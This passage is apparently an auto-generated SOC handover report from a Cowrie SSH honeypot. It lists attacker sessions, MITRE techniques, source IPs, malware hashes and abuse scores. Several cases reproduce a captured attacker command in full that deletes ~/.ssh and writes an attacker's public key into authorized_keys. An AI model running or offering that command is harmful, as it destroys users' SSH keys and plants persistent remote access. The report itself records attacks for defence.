| `2026-05-26 19:18:09` | `cowrie.command.input` |
| `2026-05-26 19:18:09` | `cowrie.session.file_download` |
| `2026-05-26 19:18:09` | `cowrie.log.closed` |
| `2026-05-26 19:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aef7f0565290

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:18 |
| **Last Seen** | 2026-05-26 19:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:18:11` | `cowrie.session.connect` |
| `2026-05-26 19:18:11` | `cowrie.client.version` |
| `2026-05-26 19:18:12` | `cowrie.client.kex` |
| `2026-05-26 19:18:12` | `cowrie.login.success` |
| `2026-05-26 19:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-123e1f4a8536

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:22 |
| **Last Seen** | 2026-05-26 19:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:22:37` | `cowrie.session.connect` |
| `2026-05-26 19:22:37` | `cowrie.client.version` |
| `2026-05-26 19:22:37` | `cowrie.client.kex` |
| `2026-05-26 19:22:38` | `cowrie.login.success` |
| `2026-05-26 19:22:38` | `cowrie.session.params` |
| `2026-05-26 19:22:38` | `cowrie.command.input` |
| `2026-05-26 19:22:38` | `cowrie.command.failed` |
| `2026-05-26 19:22:38` | `cowrie.log.closed` |
| `2026-05-26 19:22:39` | `cowrie.session.params` |
| `2026-05-26 19:22:39` | `cowrie.command.input` |
| `2026-05-26 19:22:39` | `cowrie.session.file_download` |
| `2026-05-26 19:22:39` | `cowrie.log.closed` |
| `2026-05-26 19:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-792f41a68f4f

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:22 |
| **Last Seen** | 2026-05-26 19:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:22:41` | `cowrie.session.connect` |
| `2026-05-26 19:22:41` | `cowrie.client.version` |
| `2026-05-26 19:22:41` | `cowrie.client.kex` |
| `2026-05-26 19:22:42` | `cowrie.login.success` |
| `2026-05-26 19:22:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7988da2ac9a

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:26 |
| **Last Seen** | 2026-05-26 19:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:26:56` | `cowrie.session.connect` |
| `2026-05-26 19:26:56` | `cowrie.client.version` |
| `2026-05-26 19:26:56` | `cowrie.client.kex` |
| `2026-05-26 19:26:57` | `cowrie.login.success` |
| `2026-05-26 19:26:57` | `cowrie.session.params` |
| `2026-05-26 19:26:57` | `cowrie.command.input` |
| `2026-05-26 19:26:57` | `cowrie.command.failed` |
| `2026-05-26 19:26:57` | `cowrie.log.closed` |
| `2026-05-26 19:26:58` | `cowrie.session.params` |
| `2026-05-26 19:26:58` | `cowrie.command.input` |
| `2026-05-26 19:26:58` | `cowrie.session.file_download` |
| `2026-05-26 19:26:58` | `cowrie.log.closed` |
| `2026-05-26 19:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6317fc653370

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:27 |
| **Last Seen** | 2026-05-26 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:27:00` | `cowrie.session.connect` |
| `2026-05-26 19:27:00` | `cowrie.client.version` |
| `2026-05-26 19:27:01` | `cowrie.client.kex` |
| `2026-05-26 19:27:01` | `cowrie.login.success` |
| `2026-05-26 19:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84024a344e65

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:36 |
| **Last Seen** | 2026-05-26 19:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:36:24` | `cowrie.session.connect` |
| `2026-05-26 19:36:24` | `cowrie.client.version` |
| `2026-05-26 19:36:24` | `cowrie.client.kex` |
| `2026-05-26 19:36:25` | `cowrie.login.success` |
| `2026-05-26 19:36:25` | `cowrie.session.params` |
| `2026-05-26 19:36:25` | `cowrie.command.input` |
| `2026-05-26 19:36:25` | `cowrie.command.failed` |
| `2026-05-26 19:36:25` | `cowrie.log.closed` |
| `2026-05-26 19:36:26` | `cowrie.session.params` |
| `2026-05-26 19:36:26` | `cowrie.command.input` |
| `2026-05-26 19:36:26` | `cowrie.session.file_download` |
| `2026-05-26 19:36:26` | `cowrie.log.closed` |
| `2026-05-26 19:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fef8188cd81

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-26 19:36 |
| **Last Seen** | 2026-05-26 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 19:36:28` | `cowrie.session.connect` |
| `2026-05-26 19:36:28` | `cowrie.client.version` |
| `2026-05-26 19:36:29` | `cowrie.client.kex` |
| `2026-05-26 19:36:30` | `cowrie.login.success` |
| `2026-05-26 19:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20a4941159f3

| Field | Detail |
|---|---|
| **Source IP** | `212.51.34[.]150` |
| **First Seen** | 2026-05-26 20:11 |
| **Last Seen** | 2026-05-26 20:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 20:11:05` | `cowrie.session.connect` |
| `2026-05-26 20:11:05` | `cowrie.client.version` |
| `2026-05-26 20:11:05` | `cowrie.client.kex` |
| `2026-05-26 20:11:06` | `cowrie.login.success` |
| `2026-05-26 20:11:06` | `cowrie.session.params` |
| `2026-05-26 20:11:06` | `cowrie.command.input` |
| `2026-05-26 20:11:06` | `cowrie.command.failed` |
| `2026-05-26 20:11:07` | `cowrie.log.closed` |
| `2026-05-26 20:11:07` | `cowrie.session.params` |
| `2026-05-26 20:11:07` | `cowrie.command.input` |
| `2026-05-26 20:11:07` | `cowrie.session.file_download` |
| `2026-05-26 20:11:07` | `cowrie.log.closed` |
| `2026-05-26 20:11:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.51.34[.]150` to AbuseIPDB if not already reported
- [ ] Block `212.51.34[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2dc5c1403cf

| Field | Detail |
|---|---|
| **Source IP** | `212.51.34[.]150` |
| **First Seen** | 2026-05-26 20:11 |
| **Last Seen** | 2026-05-26 20:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 20:11:10` | `cowrie.session.connect` |
| `2026-05-26 20:11:10` | `cowrie.client.version` |
| `2026-05-26 20:11:10` | `cowrie.client.kex` |
| `2026-05-26 20:11:11` | `cowrie.login.success` |
| `2026-05-26 20:11:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.51.34[.]150` to AbuseIPDB if not already reported
- [ ] Block `212.51.34[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff94d2acc570

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]112` |
| **First Seen** | 2026-05-26 21:21 |
| **Last Seen** | 2026-05-26 21:22 |
| **Session Duration** | 20s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 21:21:41` | `cowrie.session.connect` |
| `2026-05-26 21:21:41` | `cowrie.client.version` |
| `2026-05-26 21:21:42` | `cowrie.client.kex` |
| `2026-05-26 21:21:43` | `cowrie.client.fingerprint` |
| `2026-05-26 21:21:43` | `cowrie.login.failed` |
| `2026-05-26 21:21:43` | `cowrie.login.success` |
| `2026-05-26 21:22:01` | `cowrie.direct-tcpip.request` |
| `2026-05-26 21:22:01` | `cowrie.direct-tcpip.ja4` |
| `2026-05-26 21:22:01` | `cowrie.direct-tcpip.data` |
| `2026-05-26 21:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]112` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]112` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `98.158.129[.]28` | **25** | 2026-05-26 18:48 | 2026-05-26 21:45 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `81.9.145[.]130` | **20** | 2026-05-26 18:49 | 2026-05-26 19:36 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.148.224[.]83` | **3** | 2026-05-26 21:42 | 2026-05-26 21:47 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `135.119.112[.]78` | **2** | 2026-05-26 19:17 | 2026-05-26 19:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]66` | 1 | 2026-05-26 19:04 | 2026-05-26 19:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.131.61[.]163` | 1 | 2026-05-26 20:16 | 2026-05-26 20:17 | 31s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]128` | 1 | 2026-05-26 20:58 | 2026-05-26 20:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]149` | 1 | 2026-05-26 20:58 | 2026-05-26 20:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]195` | 1 | 2026-05-26 18:48 | 2026-05-26 18:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.186.7[.]10` | 1 | 2026-05-26 21:36 | 2026-05-26 21:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.36.136[.]12` | 1 | 2026-05-26 18:44 | 2026-05-26 18:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.122[.]158` | 1 | 2026-05-26 20:34 | 2026-05-26 20:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.169[.]175` | 1 | 2026-05-26 19:54 | 2026-05-26 19:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.234[.]93` | 1 | 2026-05-26 20:24 | 2026-05-26 20:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `198.98.62[.]211` | 1 | 2026-05-26 19:09 | 2026-05-26 19:09 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.51.34[.]150` | 1 | 2026-05-26 20:11 | 2026-05-26 20:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.3.227[.]130` | 1 | 2026-05-26 21:11 | 2026-05-26 21:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `94.102.49[.]125` | 1 | 2026-05-26 19:18 | 2026-05-26 19:18 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `186.148.224[.]83` | AR | GRUPO IN S.A.S | **100** ⚠️ | 1 |
| `192.42.116[.]112` | NL | TOR EXIT AND MORE | **100** ⚠️ | 50 |
| `212.51.34[.]150` | ES | R Cable y Telecomunicaciones Galicia S.A. | **100** ⚠️ | 9 |
| `87.3.227[.]130` | IT | Telecom Italia S.p.A. TIN EASY LITE | **100** ⚠️ | 1 |
| `118.122.147[.]195` | CN | CHINANET Sichuan province network | **100** ⚠️ | 50 |
| `98.158.129[.]28` | CA | Colosseum Online Inc. | **100** ⚠️ | 1 |
| `135.119.112[.]78` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `180.76.234[.]93` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 14 |
| `120.48.122[.]158` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `81.9.145[.]130` | ES | Global Telecommunication Service Provider | **100** ⚠️ | 16 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 53 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 28 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 95 cases |
| Tool 34  | Credential Extractor        | ✅ 51 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (8.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 23 priority case(s) shown individually · 18 recon entry/entries in table (4 group(s) consolidating 50 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-26T21:48:54Z_
